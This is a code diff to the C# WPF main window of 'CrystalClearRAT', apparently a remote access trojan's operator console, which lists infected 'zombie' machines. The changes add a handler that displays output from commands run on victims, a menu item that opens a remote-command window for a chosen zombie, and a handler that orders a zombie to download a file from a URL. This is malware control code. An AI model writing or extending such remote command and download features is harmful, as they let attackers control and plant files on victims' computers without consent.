@@ -1,5 +1,7 @@
-﻿using CrystalClearRAT.Functions;
+﻿using CrystalClearRAT.Event;
+using CrystalClearRAT.Functions;
 using CrystalClearRAT.Web;
+using CrystalClearRAT.Windows;
 using CrystalClearRAT.ZombieModel;
 using CrystalRATShared.Commands;
 using CrystalRATShared.Serialization;
@@ -35,6 +37,18 @@ namespace CrystalClearRAT
         {
             InitializeComponent();
             zombieListView.ItemsSource = Zombie.Zombies;
+            SubscirbeEvents();
+        }
+
+        private void SubscirbeEvents()
+        {
+            FunctionManager.GenericCommandReceived += OnGenericCommandReceived;
+        }
+
+        private void OnGenericCommandReceived(object sender, EventArgs e)
+        {
+            Dispatcher.Invoke(() => { commandOutput.Text = (e as GenericCommandArgs).Command + commandOutput.Text; });
+
         }
 
         private void Grid_Loaded(object sender, RoutedEventArgs e)
@@ -48,7 +62,7 @@ namespace CrystalClearRAT
 
         private void Button_Click(object sender, RoutedEventArgs e)
         {
-            Server.Send(RemoteCMD.Command("error"), Zombie.Zombies[0]);
+
         }
 
         private void OnMouseRightButtonDown(object sender, MouseButtonEventArgs e)
@@ -68,8 +82,12 @@ namespace CrystalClearRAT
 
         private void RemoteCMDItem_Click(object sender, RoutedEventArgs e)
         {
-            Console.WriteLine(GetZombieFromMenuItem(sender).IP);
+            new CommandWindow(GetZombieFromMenuItem(sender)).Show();
+        }
 
+        private void URLDownloadRequest_Click(object sender, RoutedEventArgs e)
+        {
+            Server.Send(Download.Request(@"https://image.freepik.com/darmowe-wektory/kwiatowy-litera-l-alfabet-wektor_53876-87377.jpg", "saved.png"), GetZombieFromMenuItem(sender));
         }
 
         private static Zombie GetZombieFromMenuItem(object menuItem)
